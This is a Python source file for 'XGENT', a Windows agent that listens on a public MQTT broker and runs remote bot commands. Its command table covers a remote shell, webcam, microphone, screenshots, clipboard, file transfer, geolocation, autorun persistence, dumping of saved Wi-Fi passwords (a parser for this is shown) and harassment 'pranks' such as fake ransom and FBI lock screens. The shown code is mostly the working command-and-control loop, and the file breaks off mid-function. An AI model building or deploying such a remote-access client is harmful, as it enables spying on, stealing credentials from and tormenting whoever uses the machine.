"""Клиент XGENT для Windows (Asus).

Подключается к публичному MQTT-брокеру, слушает команды бота
и выполняет их на этой машине. Прозрачная версия: в системном трее
всегда виден значок с пунктом «Остановить XGENT».
"""

import base64
import ctypes
import io
import json
import logging
import math
import os
from pathlib import Path
import random
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import webbrowser
import winreg
import winsound
from logging.handlers import RotatingFileHandler

import paho.mqtt.client as mqtt
import psutil

from config import (
    CONFIG_DIR,
    DEFAULT_SHARED_KEY,
    DEVICE_ID,
    DEVICE_NAME,
    ENCRYPT_PAYLOAD,
    HEARTBEAT_INTERVAL,
    MQTT_BROKER,
    MQTT_PASSWORD,
    MQTT_PORT,
    MQTT_PREFIX,
    MQTT_TLS,
    MQTT_USERNAME,
    PLATFORM,
    SHARED_KEY,
    VERSION,
)
from crypto import sign_message, verify_message
from xgencrypto import decrypt_payload, encrypt_payload

log = logging.getLogger("xgent.wds")

# Команды, которые умеет выполнять этот клиент. Используются и для
# маршрутизации, и для отчёта о возможностях (capabilities).
SUPPORTED_COMMANDS = (
    "open_url",
    "notify",
    "sound",
    "status_request",
    "screenshot",
    "webcam",
    "sysinfo",
    "processes",
    "battery",
    "geo_location",
    "shell",
    "network",
    "services",
    "clipboard",
    "clipboard_set",
    "kill_process",
    "disks",
    "volume_set",
    "mic",
    "open_app",
    "capabilities",
    "lock",
    "volume_toggle",
    "power",
    "stop",
    "dir_list",
    "file_get",
    "file_put",
    "file_del",
    "find_file",
    "path_open",
    "ext_ip",
    "screen_off",
    "screensaver_on",
    "wallpaper_set",
    "msgbox_spam",
    "type_text",
    "hotkey",
    "proc_kill_name",
    "wifi_info",
    "usb_devices",
    "startup_list",
    "env_get",
    "netstat",
    "download_url",
    "prank_screamer",
    "prank_rickroll",
    "prank_matrix",
    "prank_siren",
    "prank_shout_tts",
    "prank_swap_mouse",
    "prank_crazy_cursor",
    "prank_hide_desktop",
    "prank_dancing_windows",
    "prank_black_screen",
    "prank_random_site",
    "display_brightness",
    "display_night_light",
    "display_rotate",
    "net_wifi_passwords",
    "net_bluetooth_list",
    "storage_smart",
    "sys_installed_apps",
    "sys_history_cmd",
    # Режим ожидания (Watchdog) и автозапуск
    "standby_sleep",
    "wake",
    "autorun_status",
    "autorun_enable",
    "autorun_disable",
    # Системные утилиты и диагностика
    "sys_uptime",
    "sys_clean_temp",
    "net_ping",
    # Расширенная матрица приколов (40 приколов)
    "prank_bsod",
    "prank_fake_update",
    "prank_toast_spam",
    "prank_keyboard_disco",
    "prank_beep_morse",
    "prank_open_notepad_type",
    "prank_hacker_typer",
    "prank_sound_spooky",
    "prank_sound_fart",
    "prank_minimize_all",
    "prank_open_calc_spam",
    "prank_invert_screen",
    "prank_slow_mouse",
    "prank_random_clicks",
    "prank_paste_clipboard_spam",
    "prank_type_reversed",
    "prank_volume_jump",
    "prank_say_whisper",
    "prank_fake_virus",
    "prank_open_cd",
    "prank_change_wallpaper",
    "prank_restore_wallpaper",
    "prank_speak_time",
    "prank_rickroll_terminal",
    "prank_screen_off_brief",
    "prank_alert_loop",
    "prank_open_browser_memes",
    "prank_glitch_cursor",
    "prank_shake_window",
    # Новые мега-приколы и троллинг (до 55 приколов)
    "prank_meme_wallpaper",
    "prank_caps_disco",
    "prank_cursor_circle",
    "prank_fake_error_spam",
    "prank_fake_delete_sys32",
    "prank_ghost_typer",
    "prank_fbi_lock",
    "prank_cat_invaders",
    "prank_fake_ransom_cats",
    "prank_nyan_stream",
    "prank_random_beeps",
    "prank_confetti_winner",
    "prank_low_battery_fake",
    "prank_earthquake",
    "prank_laugh_track",
    "prank_stop_all",
    # Обновление и безопасность
    "agent_update",
    "uninstall_agent",
)



# =====================================================================
#  Чистые функции форматирования (тестируются без MQTT/оборудования)
# =====================================================================

def _humanize_seconds(secs):
    """Человекочитаемое время из секунд: '5ч 32мин' / '12мин' / None."""
    if secs is None:
        return None
    try:
        secs = int(secs)
    except (TypeError, ValueError):
        return None
    if secs < 0:
        return None
    hours, remainder = divmod(secs, 3600)
    minutes, _ = divmod(remainder, 60)
    if hours:
        return f"{hours}ч {minutes}мин"
    return f"{minutes}мин"


def _format_battery(battery):
    """Приводит psutil.sbattery (или None) к словарю для MQTT.

    Возвращает {"available": False} если батареи нет.
    """
    if battery is None:
        return {"available": False}
    secsleft = battery.secsleft
    if secsleft in (psutil.POWER_TIME_UNLIMITED, psutil.POWER_TIME_UNKNOWN):
        secsleft = None
    plugged = bool(battery.power_plugged)
    return {
        "available": True,
        "percent": round(float(battery.percent), 1),
        "power_plugged": plugged,
        "secsleft": int(secsleft) if secsleft is not None else None,
        "time_left": _humanize_seconds(secsleft),
        "state": "charging" if plugged else "on_battery",
    }


def _format_network(addrs, stats, io):
    """Сводка по сетевым интерфейсам и суммарному трафику."""
    interfaces = []
    for name in sorted(addrs.keys()):
        nic_addrs = addrs[name]
        nic_stats = stats.get(name)
        ipv4 = ipv6 = mac = None
        for a in nic_addrs:
            if a.family == socket.AF_INET:
                ipv4 = a.address
            elif a.family == socket.AF_INET6:
                ipv6 = a.address.split("%")[0]
            elif a.family == psutil.AF_LINK:
                mac = a.address
        interfaces.append({
            "name": name,
            "ipv4": ipv4,
            "ipv6": ipv6,
            "mac": mac,
            "up": bool(nic_stats.isup) if nic_stats else False,
            "speed_mbps": nic_stats.speed if nic_stats else 0,
        })
    totals = {"bytes_sent": 0, "bytes_recv": 0}
    for counters in (io or {}).values():
        totals["bytes_sent"] += counters.bytes_sent
        totals["bytes_recv"] += counters.bytes_recv
    return {"interfaces": interfaces, "totals": totals}


def _format_services(services):
    """Сводка по службам Windows: счётчики и auto-start, которые не запущены.

    Только чтение. Не запускает и не останавливает службы.
    """
    total = 0
    running = 0
    failed_auto = []
    for svc in services:
        total += 1
        try:
            status = svc.status()
        except Exception:
            status = "unknown"
        if status == "running":
            running += 1
            continue
        try:
            start_type = svc.start_type()
        except Exception:
            start_type = "unknown"
        if start_type == "auto":
            failed_auto.append({
                "name": svc.name(),
                "display_name": svc.display_name(),
                "status": status,
            })
    return {
        "total": total,
        "running": running,
        "stopped": total - running,
        "failed_auto_start": failed_auto,
    }


def _format_processes(procs, top_n=5):
    """Топ-N процессов по памяти. Возвращает совместимые с ботом `lines`

    и структурированный `top` для будущих клиентов.
    """
    items = []
    for proc in procs:
        try:
            info = proc.info
        except Exception:
            continue
        name = info.get("name")
        mem = info.get("memory_percent") or 0
        items.append((name, mem, info.get("pid")))
    items.sort(key=lambda x: (x[1] or 0), reverse=True)
    top = items[:top_n]
    lines = [
        f"{name}: {mem:.1f}%" for name, mem, _ in top if name is not None
    ]
    structured = [
        {"name": n, "pid": pid, "mem_percent": round(m, 1)}
        for n, m, pid in top if n is not None
    ]
    return {"lines": lines, "top": structured}


def _primary_mac():
    """Первый валидный MAC из сетевых интерфейсов (для Wake-on-LAN)."""
    for addrs in psutil.net_if_addrs().values():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac = (addr.address or "").strip()
                if mac and mac.lower().replace("-", ":") != "00:00:00:00:00:00":
                    return mac
    return None


def _format_disks(partitions):
    """Список дисков с размерами (чистая функция — тестируется)."""
    disks = []
    for part in partitions:
        try:
            usage = psutil.disk_usage(part.mountpoint)
        except Exception:
            continue
        disks.append({
            "device": part.device,
            "mountpoint": part.mountpoint,
            "fstype": part.fstype,
            "total_gb": round(usage.total / (1024 ** 3), 1),
            "free_gb": round(usage.free / (1024 ** 3), 1),
            "percent": round(usage.percent, 1),
        })
    return disks


def _list_directory(path: str) -> dict:
    """Чистая функция: список файлов папки (имя, тип, размер)."""
    entries = []
    base = os.path.expandvars(os.path.expanduser(path or "."))
    try:
        for entry in sorted(os.scandir(base), key=lambda e: (not e.is_dir(), e.name.lower())):
            item = {"name": entry.name, "is_dir": entry.is_dir()}
            if not item["is_dir"]:
                try:
                    item["size"] = entry.stat().st_size
                except OSError:
                    item["size"] = 0
            entries.append(item)
        return {"ok": True, "path": base, "files": entries[:100], "total": len(entries)}
    except OSError as exc:
        return {"ok": False, "path": base, "error": str(exc), "files": [], "total": 0}


def _find_matches(pattern: str, root: str, limit: int = 30, max_depth: int = 4) -> dict:
    """Чистая функция: поиск файлов по подстроке имени (без сторонних зависимостей)."""
    matches = []
    for current, dirs, files in os.walk(os.path.expanduser(root or "~")):
        depth = current[len(root):].count(os.sep)
        if depth >= max_depth:
            dirs[:] = []
            continue
        for name in files:
            if pattern.lower() in name.lower():
                matches.append(os.path.join(current, name))
                if len(matches) >= limit:
                    return {"ok": True, "matches": matches, "total": len(matches)}
    return {"ok": True, "matches": matches, "total": len(matches)}


def map_hotkeys(spec: str) -> list[int]:
    """Разобрать 'ctrl+shift+esc' → список VK-кодов (для keybd_event)."""
    VK_MAP = {
        "win": 0x5B, "ctrl": 0x11, "alt": 0x12, "shift": 0x10,
        "enter": 0x0D, "esc": 0x1B, "tab": 0x09, "space": 0x20,
        "backspace": 0x08, "delete": 0x2E, "up": 0x26, "down": 0x28,
        "left": 0x25, "right": 0x27, "home": 0x24, "end": 0x23,
    }
    keys = []
    for raw in (spec or "").lower().split("+"):
        raw = raw.strip()
        if not raw:
            continue
        if raw in VK_MAP:
            keys.append(VK_MAP[raw])
        elif len(raw) == 1 and raw.isalnum():
            keys.append(ord(raw.upper()))
        elif re.fullmatch(r"f[1-9]|f1[0-2]", raw):
            keys.append(0x70 + int(raw[1:]) - 1)
        else:
            raise ValueError(f"unknown key: {raw}")
    return keys


# ---------- волна 2: диагностика и удалённые операции ----------

def _parse_wifi_output(text: str) -> dict:
    """Чистая функция: SSID и сигнал из netsh wlan show interfaces."""
    ssid = signal = None
    for line in (text or "").splitlines():
        low = line.lower()
        if ":" not in line:
            continue
        value = line.split(":", 1)[1].strip()
        if "ssid" in low and "bssid" not in low and value:
            ssid = value
        if ("signal" in low or "сигнал" in low) and value:
            signal = value
    return {"ssid": ssid, "signal": signal}


def _parse_reg_query(text: str) -> list[str]:
    """Чистая функция: имена записей autostart из reg query."""
    names = []
    for line in (text or "").splitlines():
        line = line.strip()
        if line and not line.startswith("HKEY_") and "REG_SZ" in line:
            name = line.split("    ")[0].strip()
            if name:
                names.append(name)
    return names


def _collect_env(names: list[str] | None = None) -> dict:
    """Чистая функция: выбрать переменные окружения (без значений паролей)."""
    SAFE_KEYS = (
        "PATH", "USERNAME", "USER", "HOME", "USERPROFILE", "COMPUTERNAME",
        "HOSTNAME", "OS", "TEMP", "TMP", "NUMBER_OF_PROCESSORS",
        "PROCESSOR_ARCHITECTURE", "LANG", "SHELL", "PYTHON_HOME",
    )
    wanted = [n.upper() for n in (names or SAFE_KEYS)]
    result = {}
    for key, value in os.environ.items():
        if key.upper() in wanted:
            result[key] = value if len(value) < 400 else value[:397] + "..."
    return result


def _kill_by_name(name: str) -> dict:
    """Убить все процессы, чьё имя содержит подстроку (кроме себя)."""
    low = (name or "").strip().lower()
    if not low:
        return {"ok": False, "error": "empty name", "count": 0, "killed": []}
    killed, errors = [], []
    me = os.getpid()
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if proc.info["pid"] == me:
                continue
            pname = (proc.info.get("name") or "").lower()
            if low in pname:
                proc.kill()
                killed.append(proc.info["pid"])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as exc:
            errors.append(str(exc))
    return {"ok": True, "count": len(killed), "killed": killed[:20], "errors": errors[:5]}


# ---------- хелперы: экран, сеть, диски, софт (чистые, тестируемые) ----------

def _clamp(value, lo, hi, default):
    """Привести value к int в [lo..hi]; при ошибке — default."""
    try:
        return max(lo, min(hi, int(value)))
    except (TypeError, ValueError):
        return default


def _orientation_value(angle) -> int | None:
    """Угол поворота экрана → DMDO_* (0,1,2,3). None если угол не кратен 90°."""
    try:
        a = int(angle) % 360
    except (TypeError, ValueError):
        return None
    return {0: 0, 90: 1, 180: 2, 270: 3}.get(a)


def _parse_wifi_profile_names(text: str) -> list[str]:
    """Имена Wi-Fi профилей из `netsh wlan show profiles` (ru/en)."""
    names: list[str] = []
    for line in (text or "").splitlines():
        if ":" not in line:
            continue
        low = line.lower()
        if "profile" not in low and "профил" not in low:
            continue
        value = line.split(":", 1)[1].strip()
        if value and value not in names:
            names.append(value)
    return names


def _parse_key_content(text: str) -> str | None:
    """Пароль (Key Content) из вывода `netsh wlan show profile ... key=clear`."""
    for line in (text or "").splitlines():
        low = line.lower()
        if ("key content" in low or "содержимое ключа" in low) and ":" in line:
            value = line.split(":", 1)[1].strip()
            return value or None
    return None


# --- Night Light: reverse-engineered CloudStore blob (nightlight-cli, MIT) ---

NL_STATE_SUBKEY = (
    r"Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\DefaultAccount\Current"
    r"\default$windows.data.bluelightreduction.bluelightreductionstate"
    r"\windows.data.bluelightreduction.bluelightreductionstate"
)


def _night_light_enabled(data: bytes) -> bool:
    """True, если Night Light включён (по байту состояния)."""
    return bool(data) and len(data) > 18 and data[18] == 0x15


def _night_light_toggle_bytes(data: bytes) -> bytes:
    """Построить новый CloudStore-blob с переключённым состоянием.

    Раскладка взята из nightlight-cli (реверс-инжиниринг NightLight.cs):
    байт [18] == 0x15 — включено, 0x13 — выключено; при переключении длина
    блоба меняется (41/43 байта), счётчик обновляется в байтах 10..14.
    """
    raw = bytearray(data)
    enabled = _night_light_enabled(raw)
    if enabled:
        new_data = bytearray(41)
        new_data[0:22] = raw[0:22]
        if len(raw) > 25:
            copy_len = min(len(raw) - 25, 43 - 25)
            new_data[23:23 + copy_len] = raw[25:25 + copy_len]
        new_data[18] = 0x13
    else:
        new_data = bytearray(43)
        new_data[0:22] = raw[0:22]
        if len(raw) > 23:
            copy_len = min(len(raw) - 23, 41 - 23)
            new_data[25:25 + copy_len] = raw[23:23 + copy_len]
        new_data[18] = 0x15
        new_data[23] = 0x10
        new_data[24] = 0x00
    for i in range(10, 15):
        if new_data[i] != 0xFF:
            new_data[i] = (new_data[i] + 1) % 256
            break
    return bytes(new_data)


# --- DEVMODE (ChangeDisplaySettingsEx) для поворота экрана ---

class _POINTL(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


class _DEVMODEW(ctypes.Structure):
    """Минимальный DEVMODE для смены ориентации дисплея (WinAPI wingdi.h)."""
    _fields_ = [
        ("dmDeviceName", ctypes.c_wchar * 32),
        ("dmSpecVersion", ctypes.c_ushort),
        ("dmDriverVersion", ctypes.c_ushort),
        ("dmSize", ctypes.c_ushort),
        ("dmDriverExtra", ctypes.c_ushort),
        ("dmFields", ctypes.c_ulong),
        ("dmPosition", _POINTL),
        ("dmDisplayOrientation", ctypes.c_ulong),
        ("dmDisplayFixedOutput", ctypes.c_ulong),
        ("dmColor", ctypes.c_short),
        ("dmDuplex", ctypes.c_short),
        ("dmYResolution", ctypes.c_short),
        ("dmTTOption", ctypes.c_short),
        ("dmCollate", ctypes.c_short),
        ("dmFormName", ctypes.c_wchar * 32),
        ("dmLogPixels", ctypes.c_ushort),
        ("dmBitsPerPel", ctypes.c_ulong),
        ("dmPelsWidth", ctypes.c_ulong),
        ("dmPelsHeight", ctypes.c_ulong),
        ("dmDisplayFlags", ctypes.c_ulong),
        ("dmDisplayFrequency", ctypes.c_ulong),
        ("dmICMMethod", ctypes.c_ulong),
        ("dmICMIntent", ctypes.c_ulong),
        ("dmMediaType", ctypes.c_ulong),
        ("dmDitherType", ctypes.c_ulong),
        ("dmReserved1", ctypes.c_ulong),
        ("dmReserved2", ctypes.c_ulong),
        ("dmPanningWidth", ctypes.c_ulong),
        ("dmPanningHeight", ctypes.c_ulong),
    ]


DM_DISPLAYORIENTATION = 0x00000080
CDS_RESET = 0x00000004
DISP_CHANGE_SUCCESSFUL = 0


def _rotate_screen(angle: int) -> tuple[bool, str]:
    """Повернуть экран через ChangeDisplaySettingsEx. angle: 0/90/180/270."""
    orient = _orientation_value(angle)
    if orient is None:
        return False, f"Некорректный угол: {angle!r} (нужно 0/90/180/270)"
    try:
        user32 = ctypes.windll.user32
        dm = _DEVMODEW()
        dm.dmSize = ctypes.sizeof(_DEVMODEW)
        if not user32.EnumDisplaySettingsW(None, -1, ctypes.byref(dm)):
            return False, "EnumDisplaySettings не удался"

        is_current_portrait = (dm.dmDisplayOrientation in (1, 3))
        is_target_portrait = (orient in (1, 3))
        if is_current_portrait != is_target_portrait:
            dm.dmPelsWidth, dm.dmPelsHeight = dm.dmPelsHeight, dm.dmPelsWidth
            dm.dmFields = DM_DISPLAYORIENTATION | 0x00080000 | 0x00100000  # DM_PELSWIDTH | DM_PELSHEIGHT
        else:
            dm.dmFields = DM_DISPLAYORIENTATION

        dm.dmDisplayOrientation = orient
        res = user32.ChangeDisplaySettingsExW(
            None, ctypes.byref(dm), None, CDS_RESET, None
        )
        if res != DISP_CHANGE_SUCCESSFUL:
            return False, f"ChangeDisplaySettingsEx вернул {res}"
        return True, f"Экран повёрнут на {angle}°"
    except Exception as exc:  # noqa: BLE001
        return False, f"Ошибка поворота экрана: {exc}"


# =====================================================================
#  Иконка трея и клиент
# =====================================================================

def create_image():
    """Иконка для трея: синий круг с белой кнопкой «play» (64x64)."""
    from PIL import Image, ImageDraw

    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.ellipse((2, 2, 62, 62), fill=(30, 144, 255, 255))
    draw.ellipse((9, 9, 55, 55), outline=(255, 255, 255, 255), width=3)
    draw.polygon([(28, 21), (28, 43), (48, 32)], fill=(255, 255, 255, 255))
    return img


class XgentClient:
    """MQTT-клиент: подписка на команды, heartbeat и выполнение действий."""

    def __init__(self, on_stop_requested=None) -> None:
        self.on_stop_requested = on_stop_requested
        self._running = threading.Event()
        self._running.set()
        self._client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"xgent-wds-{DEVICE_ID}",
            protocol=mqtt.MQTTv311,
        )
        # Экспоненциальный бэкофф переподключения (1с -> 120с).
        self._client.reconnect_delay_set(min_delay=1, max_delay=120)
        self._client.on_connect = self._on_connect
        self._client.on_connect_fail = self._on_connect_fail
        self._client.on_disconnect = self._on_disconnect
        self._client.on_message = self._on_message
        self._heartbeat = threading.Thread(
            target=self._heartbeat_loop, name="xgent-heartbeat", daemon=True
        )
        self._standby = False
        self._command_context = threading.local()
        self._handlers = {
            "open_url": self._do_open_url,
            "notify": self._do_notify,
            "sound": self._do_sound,
            "status_request": self._do_status_request,
            "screenshot": self._do_screenshot,
            "webcam": self._do_webcam,
            "sysinfo": self._do_sysinfo,
            "processes": self._do_processes,
            "battery": self._do_battery,
            "geo_location": self._do_geo_location,
            "shell": self._do_shell,
            "network": self._do_network,
            "services": self._do_services,
            "clipboard": self._do_clipboard,
            "clipboard_set": self._do_clipboard_set,
            "kill_process": self._do_kill_process,
            "disks": self._do_disks,
            "volume_set": self._do_volume_set,
            "mic": self._do_mic,
            "open_app": self._do_open_app,
            "capabilities": self._do_capabilities,
            "lock": self._do_lock_screen,
            "volume_toggle": self._do_volume_toggle,
            "power": self._do_power,
            "stop": self._do_stop,
            "dir_list": self._do_dir_list,
            "file_get": self._do_file_get,
            "file_put": self._do_file_put,
            "file_del": self._do_file_del,
            "find_file": self._do_find_file,
            "path_open": self._do_path_open,
            "ext_ip": self._do_ext_ip,
            "screen_off": self._do_screen_off,
            "screensaver_on": self._do_screensaver_on,
            "wallpaper_set": self._do_wallpaper_set,
            "msgbox_spam": self._do_msgbox_spam,
            "type_text": self._do_type_text,
            "hotkey": self._do_hotkey,
            "proc_kill_name": self._do_proc_kill_name,
            "wifi_info": self._do_wifi_info,
            "usb_devices": self._do_usb_devices,
            "startup_list": self._do_startup_list,
            "env_get": self._do_env_get,
            "netstat": self._do_netstat,
            "download_url": self._do_download_url,
            "prank_screamer": self._do_prank_screamer,
            "prank_rickroll": self._do_prank_rickroll,
            "prank_matrix": self._do_prank_matrix,
            "prank_siren": self._do_prank_siren,
            "prank_shout_tts": self._do_prank_shout_tts,
            "prank_swap_mouse": self._do_prank_swap_mouse,
            "prank_crazy_cursor": self._do_prank_crazy_cursor,
            "prank_hide_desktop": self._do_prank_hide_desktop,
            "prank_dancing_windows": self._do_prank_dancing_windows,
            "prank_black_screen": self._do_prank_black_screen,
            "prank_random_site": self._do_prank_random_site,
            "display_brightness": self._do_display_brightness,
            "display_night_light": self._do_display_night_light,
            "display_rotate": self._do_display_rotate,
            "net_wifi_passwords": self._do_net_wifi_passwords,
            "net_bluetooth_list": self._do_net_bluetooth_list,
            "storage_smart": self._do_storage_smart,
            "sys_installed_apps": self._do_sys_installed_apps,
            "sys_history_cmd": self._do_sys_history_cmd,
            # Режим ожидания (Watchdog) и автозапуск
            "standby_sleep": self._do_standby_sleep,
            "wake": self._do_wake,
            "autorun_status": self._do_autorun_status,
            "autorun_enable": self._do_autorun_enable,
            "autorun_disable": self._do_autorun_disable,
            # Системные утилиты и диагностика
            "sys_uptime": self._do_sys_uptime,
            "sys_clean_temp": self._do_sys_clean_temp,
            "net_ping": self._do_net_ping,
            # Расширенная матрица приколов
            "prank_bsod": self._do_prank_bsod,
            "prank_fake_update": self._do_prank_fake_update,
            "prank_toast_spam": self._do_prank_toast_spam,
            "prank_keyboard_disco": self._do_prank_keyboard_disco,
            "prank_beep_morse": self._do_prank_beep_morse,
            "prank_open_notepad_type": self._do_prank_open_notepad_type,
            "prank_hacker_typer": self._do_prank_hacker_typer,
            "prank_sound_spooky": self._do_prank_sound_spooky,
            "prank_sound_fart": self._do_prank_sound_fart,
            "prank_minimize_all": self._do_prank_minimize_all,
            "prank_open_calc_spam": self._do_prank_open_calc_spam,
            "prank_invert_screen": self._do_prank_invert_screen,
            "prank_slow_mouse": self._do_prank_slow_mouse,
            "prank_random_clicks": self._do_prank_random_clicks,
            "prank_paste_clipboard_spam": self._do_prank_paste_clipboard_spam,
            "prank_type_reversed": self._do_prank_type_reversed,
            "prank_volume_jump": self._do_prank_volume_jump,
            "prank_say_whisper": self._do_prank_say_whisper,
            "prank_fake_virus": self._do_prank_fake_virus,
            "prank_open_cd": self._do_prank_open_cd,
            "prank_change_wallpaper": self._do_prank_change_wallpaper,
            "prank_restore_wallpaper": self._do_prank_restore_wallpaper,
            "prank_speak_time": self._do_prank_speak_time,
            "prank_rickroll_terminal": self._do_prank_rickroll_terminal,
            "prank_screen_off_brief": self._do_prank_screen_off_brief,
            "prank_alert_loop": self._do_prank_alert_loop,
            "prank_open_browser_memes": self._do_prank_open_browser_memes,
            "prank_glitch_cursor": self._do_prank_glitch_cursor,
            "prank_shake_window": self._do_prank_shake_window,
            "prank_meme_wallpaper": self._do_prank_meme_wallpaper,
            "prank_caps_disco": self._do_prank_caps_disco,
            "prank_cursor_circle": self._do_prank_cursor_circle,
            "prank_fake_error_spam": self._do_prank_fake_error_spam,
            "prank_fake_delete_sys32": self._do_prank_fake_delete_sys32,
            "prank_ghost_typer": self._do_prank_ghost_typer,
            "prank_fbi_lock": self._do_prank_fbi_lock,
            "prank_cat_invaders": self._do_prank_cat_invaders,
            "prank_fake_ransom_cats": self._do_prank_fake_ransom_cats,
            "prank_nyan_stream": self._do_prank_nyan_stream,
            "prank_random_beeps": self._do_prank_random_beeps,
            "prank_confetti_winner": self._do_prank_confetti_winner,
            "prank_low_battery_fake": self._do_prank_low_battery_fake,
            "prank_earthquake": self._do_prank_earthquake,
            "prank_laugh_track": self._do_prank_laugh_track,
            "prank_stop_all": self._do_prank_stop_all,
            "agent_update": self._do_agent_update,
            "uninstall_agent": self._do_uninstall_agent,
        }
        assert set(self._handlers) == set(SUPPORTED_COMMANDS)


    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    def start(self) -> None:
        """Неблокирующий запуск: подключение, цикл MQTT и heartbeat."""
        # connect_async + loop_start сами повторяют попытки подключения,
        # включая первую, при недоступном брокере (с бэкоффом выше).
        if MQTT_TLS:
            self._client.tls_set()  # системные CA; без отключения проверки сертификата
        if MQTT_USERNAME:
            log.info("MQTT auth: %s (TLS=%s", MQTT_USERNAME, MQTT_TLS)
            self._client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

        # LWT: мгновенный offline-статус при разрыве соединения (подписанный).
        will_topic = f"{MQTT_PREFIX}/{DEVICE_ID}/status"
        will_body = {
            "type": "status", "device_id": DEVICE_ID, "name": DEVICE_NAME,
            "os": PLATFORM, "version": VERSION, "status": "offline",
        }
        will_payload = sign_message(
            encrypt_payload(will_body) if ENCRYPT_PAYLOAD else will_body
        )
        self._client.will_set(will_topic, json.dumps(will_payload, ensure_ascii=False), qos=1, retain=False)

        self._client.connect_async(MQTT_BROKER, MQTT_PORT, keepalive=60)
        self._client.loop_start()
        self._heartbeat.start()
        log.info("Клиент запущен: %s (%s)", DEVICE_NAME, DEVICE_ID)

    def stop(self) -> None:
        self._running.clear()
        self._client.loop_stop()
        self._client.disconnect()
        log.info("Клиент остановлен")

    def request_stop(self) -> None:
        """Остановка по команде из Telegram или из меню значка."""
        self._running.clear()
        if self.on_stop_requested:
            self.on_stop_requested()

    # ---------- колбэки paho-mqtt ----------

    def _on_connect(self, client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            client.subscribe(f"{MQTT_PREFIX}/{DEVICE_ID}/cmd", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/all/cmd", qos=0)
            log.info("Подключено к %s:%s", MQTT_BROKER, MQTT_PORT)
            # Подписки восстанавливаются при каждом переподключении.
            self._publish_status()
        else:
            log.warning("Не удалось подключиться к брокеру: %s", reason_code)

    def _on_connect_fail(self, client, userdata, reason_code=None):
        log.warning(
            "Попытка подключения к брокеру не удалась (код %s); "
            "автоматический повтор с бэкоффом…", reason_code
        )

    def _on_disconnect(self, client, userdata, flags, reason_code, properties=None):
        if not self._running.is_set():
            log.info("Отключение по команде остановки")
            return
        log.warning("Отключено от брокера (код %s); переподключение…", reason_code)

    def _on_message(self, client, userdata, message):
        try:
            data = json.loads(message.payload.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            log.warning("Некорректный JSON в топике %s", message.topic)
            return
        payload = verify_message(data)
        if payload is None:
            log.warning("Сообщение с неверной подписью в топике %s", message.topic)
            return
        if ENCRYPT_PAYLOAD or ("enc" in payload):
            inner = decrypt_payload(payload)
            if inner is None:
                log.warning("Не удалось расшифровать команду из %s", message.topic)
                return
            payload = inner
        self._dispatch(payload)

    # ---------- маршрутизация команд ----------

    def _dispatch(self, payload: dict) -> None:
        action = payload.get("type")
        cmd_id = payload.get("id")
        if getattr(self, "_standby", False) and action not in ("wake", "status_request"):
            log.info("Команда %s отклонена: агент в режиме ожидания", action)
            self._publish_response(
                "output",
                {
                    "type": action,
                    "device_id": DEVICE_ID,
                    "ok": False,
                    "text": "💤 Агент находится в спящем режиме (Standby).\nНажмите «☀️ Пробудить агента» в меню питания, чтобы возобновить работу.",
                },
            )
            self._publish_ack(action, "ok", cmd_id=cmd_id)
            return

        handler = self._handlers.get(action)
        if handler is None:
            log.warning("Неизвестная команда: %s", action)
            self._publish_ack(action or "?", "error", detail="unknown_command", cmd_id=cmd_id)
            return
        log.info("Выполняю команду: %s", action)
        # Подтверждение получения — часть протокола acknowledgement.
        self._publish_ack(action, "received", cmd_id=cmd_id)
        self._run_threaded(action, cmd_id, handler, payload)

    def _run_threaded(self, action, cmd_id, func, payload) -> None:
        """Запускает обработчик в потоке, отправляет ack ok/error + логирует."""

        def _worker() -> None:
            self._command_context.cmd_id = cmd_id
            try:
                func(payload)
            except Exception:
                log.exception("Команда %s завершилась ошибкой", action)
                self._publish_ack(action, "error", detail="exception", cmd_id=cmd_id)
            else:
                self._publish_ack(action, "ok", cmd_id=cmd_id)
            finally:
                try:
                    del self._command_context.cmd_id
                except AttributeError:
                    pass

        threading.Thread(target=_worker, name=f"xgent-cmd-{action}", daemon=True).start()

    # ---------- heartbeat и статус ----------

    def _publish_status(self) -> None:
        status = "standby" if getattr(self, "_standby", False) else "online"
        payload = {
            "type": "status",
            "device_id": DEVICE_ID,
            "name": DEVICE_NAME,
            "os": PLATFORM,
            "version": VERSION,
            "status": status,
        }
        body = encrypt_payload(payload) if ENCRYPT_PAYLOAD else payload
        envelope = sign_message(body)
        self._client.publish(
            f"{MQTT_PREFIX}/{DEVICE_ID}/status",
            json.dumps(envelope, ensure_ascii=False),
            qos=1,
        )

    def _publish_response(self, topic_suffix: str, payload: dict) -> None:
        """Отправить подписанный ответ в топик {prefix}/{device_id}/{suffix}."""
        cmd_id = getattr(self._command_context, "cmd_id", None)
        if cmd_id is not None and "id" not in payload:
            payload = {**payload, "id": cmd_id}
        body = encrypt_payload(payload) if ENCRYPT_PAYLOAD else payload
        envelope = sign_message(body)
        info = self._client.publish(
            f"{MQTT_PREFIX}/{DEVICE_ID}/{topic_suffix}",
            json.dumps(envelope, ensure_ascii=False),
            qos=0,
        )
        if info.rc != mqtt.MQTT_ERR_SUCCESS:
            log.warning("Не удалось опубликовать ответ %s (rc=%s)", topic_suffix, info.rc)

    def _publish_ack(self, action, status, detail=None, cmd_id=None) -> None:
        """Подтверждение выполнения команды (received/ok/error)."""
        payload = {
            "type": "ack",
            "device_id": DEVICE_ID,
            "action": action,
            "status": status,
        }
        if cmd_id is not None:
            payload["id"] = cmd_id
        if detail:
            payload["detail"] = detail
        self._publish_response("ack", payload)

    def _heartbeat_loop(self) -> None:
        while self._running.is_set():
            time.sleep(HEARTBEAT_INTERVAL + random.uniform(0, 10))
            if self._running.is_set() and self._client.is_connected():
                self._publish_status()

    # ---------- действия ----------

    def _do_open_url(self, payload: dict) -> None:
        url = payload.get("url", "")
        if not url:
            log.warning("Команда open_url без ссылки")
            return
        webbrowser.open(url)
        self._notify_text(f"Открываю: {url}")

    def _do_notify(self, payload: dict) -> None:
